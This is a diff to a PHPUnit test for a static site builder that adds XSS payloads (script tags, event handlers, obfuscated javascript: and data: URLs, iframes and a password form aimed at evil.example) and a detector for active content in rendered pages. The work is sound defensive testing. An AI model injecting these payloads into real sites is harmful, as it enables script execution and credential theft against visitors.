@@ -4,6 +4,7 @@ declare(strict_types=1);
 
 namespace SsgLab\Tests;
 
+use Dom\HTMLDocument;
 use DOMDocument;
 use DOMElement;
 use DOMXPath;
@@ -14,6 +15,15 @@ use SsgLab\SiteBuilder;
 
 class SiteBuilderTest extends TestCase
 {
+    /** Elements that run script, load from elsewhere, submit data or redirect; none belongs in page content. */
+    private const ACTIVE_ELEMENTS = [
+        'script', 'iframe', 'frame', 'frameset', 'object', 'embed', 'applet', 'form', 'base', 'meta',
+        'style', 'link', 'noscript', 'svg', 'math',
+    ];
+
+    /** Attributes a browser follows or loads as a URL. */
+    private const URL_ATTRIBUTES = ['href', 'src', 'action', 'formaction', 'xlink:href'];
+
     private string $pagesDir;
     private string $outDir;
 
@@ -247,6 +257,123 @@ class SiteBuilderTest extends TestCase
 
         self::assertFileDoesNotExist($this->outDir . '/.attachments.1/' . $path);
         self::assertFileExists($this->outDir . '/index.html');
+    }
+
+    /**
+     * Markdown that tries to get active content into a page, through every stage of the pipeline
+     * that touches the HTML: the multiline table preprocessor, CommonMark and its extensions,
+     * HTMLPurifier and the attachment link rewrite after it.
+     *
+     * @return array<string, array{string}>
+     */
+    public static function xssPayloads(): array
+    {
+        return [
+            // MultilineTablePreprocessor renders cells itself and splices the HTML in.
+            'script in a table cell' => ["| a |\n|---|\n| <script>alert(1)</script> |"],
+            'event handler in a table cell' => ["| a |\n|---|\n| <img src=x onerror=alert(1)> |"],
+            'event handler in a header cell' => ["| <svg onload=alert(1)> |\n|---|\n| a |"],
+            'event handler in a multi-line cell' => ["| a |\n|---|\n| first \\\n| <img src=x onerror=alert(1)> |"],
+            'javascript link in a table cell' => ["| a |\n|---|\n| [x](javascript:alert(1)) |"],
+            // FencedCodeRenderer builds the class attribute from the info string.
+            'fence info string closing the tag' => ["```\"><script>alert(1)</script>\ncode\n```"],
+            'fence info string adding an attribute' => ["```php onmouseover=alert(1)\ncode\n```"],
+            'image alt text closing the attribute' => ['![" onerror="alert(1)](.attachments.1/a.png)'],
+            'image title closing the attribute' => ['![a](.attachments.1/a.png "\" onload=\"alert(1)")'],
+            'data URL image' => ['![x](data:image/svg+xml,<svg onload=alert(1)>)'],
+            'javascript link' => ['[x](javascript:alert(1))'],
+            'javascript link in mixed case' => ['[x](JaVaScRiPt:alert(1))'],
+            'javascript link, entity-encoded' => ['[x](&#106;avascript:alert(1))'],
+            'javascript link split by a tab' => ["<a href=\"java\tscript:alert(1)\">x</a>"],
+            'data URL link' => ['<a href="data:text/html,<script>alert(1)</script>">x</a>'],
+            'iframe' => ['<iframe src="https://evil.example/"></iframe>'],
+            'object' => ['<object data="x.swf"></object>'],
+            'embed' => ['<embed src="x.swf">'],
+            'form' => ['<form action="https://evil.example/"><input type="password" name="p"></form>'],
+            'style element' => ['<style>body { background: url(https://evil.example/) }</style>'],
+            'base element' => ['<base href="https://evil.example/">'],
+            'meta refresh' => ['<meta http-equiv="refresh" content="0;url=https://evil.example/">'],
+            'external stylesheet' => ['<link rel="stylesheet" href="https://evil.example/x.css">'],
+            'script inside svg' => ['<svg><script>alert(1)</script></svg>'],
+            'noscript mutation' => ['<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>'],
+            // Elements MarkdownConverter allow-lists on top of HTMLPurifier's defaults.
+            'event handlers on details and summary' => ['<details ontoggle="alert(1)" open><summary onclick="alert(1)">s</summary>x</details>'],
+            'event handler on a text input' => ['<input type="text" onfocus="alert(1)" autofocus>'],
+            'event handler on a checkbox' => ['<input type="checkbox" onclick="alert(1)">'],
+            'javascript URL in a style attribute' => ['<p style="background:url(javascript:alert(1))">x</p>'],
+            // Aimed at the regex rewriting attachment links on leaf pages after purification.
+            'attachment path closing the attribute' => ["<img src='.attachments.1/a.png\" onerror=\"alert(1)'>"],
+        ];
+    }
+
+    /**
+     * Checks the pages as written, so the stages after HTMLPurifier are covered too. Each payload
+     * is rendered as a folder page and as a leaf page, which has its attachment links rewritten.
+     */
+    #[DataProvider('xssPayloads')]
+    public function testRenderedPagesCarryNoActiveContent(string $markdown): void
+    {
+        file_put_contents($this->pagesDir . '/Readme.md', $markdown);
+        file_put_contents($this->pagesDir . '/Leaf.md', $markdown);
+
+        (new SiteBuilder())->build($this->pagesDir, $this->outDir);
+
+        foreach (['index.html', 'Leaf/index.html'] as $page) {
+            $findings = self::activeContent((string)file_get_contents($this->outDir . '/' . $page));
+            self::assertSame([], $findings, "{$page}: " . implode(', ', $findings));
+        }
+    }
+
+    public function testActiveContentDetectorFlagsActiveContent(): void
+    {
+        $findings = self::activeContent(
+            '<main><script>alert(1)</script><img src="x.png" onerror="alert(1)">'
+            . '<a href=" JaVa&#9;script:x">a</a><img src="data:image/png;base64,AA">'
+            . '<p style="background:url(javascript:x)">p</p></main>',
+        );
+
+        self::assertSame([
+            '<script>',
+            '<img onerror>',
+            '<a href=JaVascript:x>',
+            '<img src=data:image/png;base64,AA>',
+            '<p style=background:url(javascript:x)>',
+        ], $findings);
+        self::assertSame([], self::activeContent('<main><p><a href="sub/">x</a> <img src=".attachments.1/a.png"></p></main>'));
+    }
+
+    /**
+     * Active content inside `<main>`, parsed the way a browser parses it: elements from
+     * self::ACTIVE_ELEMENTS, event handler attributes, `javascript:`/`vbscript:`/`data:` URLs (with
+     * the whitespace and control characters browsers ignore removed) and script in `style`.
+     * Everything outside `<main>`, such as the template's own theme.js, is the page template's.
+     *
+     * @return list<string> One entry per finding, e.g. `<img onerror>`
+     */
+    private static function activeContent(string $html): array
+    {
+        $document = HTMLDocument::createFromString($html, LIBXML_NOERROR);
+
+        $findings = [];
+        foreach ($document->querySelectorAll('main *') as $element) {
+            $tag = $element->localName;
+            if (in_array($tag, self::ACTIVE_ELEMENTS, true)) {
+                $findings[] = "<{$tag}>";
+            }
+            foreach ($element->attributes as $attribute) {
+                $name = strtolower($attribute->name);
+                $url = (string)preg_replace('/[\x00-\x20]+/', '', $attribute->value);
+                if (str_starts_with($name, 'on')) {
+                    $findings[] = "<{$tag} {$name}>";
+                } elseif (in_array($name, self::URL_ATTRIBUTES, true) && preg_match('/^(javascript|vbscript|data):/i', $url) === 1) {
+                    $findings[] = "<{$tag} {$name}={$url}>";
+                } elseif ($name === 'style' && preg_match('/javascript:|expression\(/i', $attribute->value) === 1) {
+                    $findings[] = "<{$tag} style={$attribute->value}>";
+                }
+            }
+        }
+
+        return $findings;
     }
 
     private function writeAttachment(string $relativePath): void
